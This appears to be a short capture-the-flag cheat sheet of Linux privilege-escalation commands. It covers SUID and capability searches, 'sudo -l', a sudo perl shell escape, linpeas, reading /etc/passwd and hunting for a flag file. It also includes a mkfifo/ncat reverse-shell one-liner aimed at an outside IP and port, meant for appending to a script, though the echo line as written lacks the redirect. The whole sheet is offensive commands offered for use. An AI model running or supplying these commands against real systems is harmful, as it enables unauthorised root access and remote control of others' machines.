
```
find / -perm -u=s -type f 2>/dev/null
```

or

```
sudo /usr/bin/perl -e 'exec "/bin/sh";'
```

or do

```
sudo -l
```

or 

```
getcap -r / 2>/dev/null 
```

or run 

```
linpeas
```

To check the user 

```
cat /etc/passwd
```

To append something 

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u 10.17.5.55 9001 >/tmp/f" /etc/copy.sh 
```

to check which reverse shell is required

```
which nc
```

To find the flag 

```
find / -name local.txt 2>/dev/null   modify local.txt as per name or do *.txt for all
```

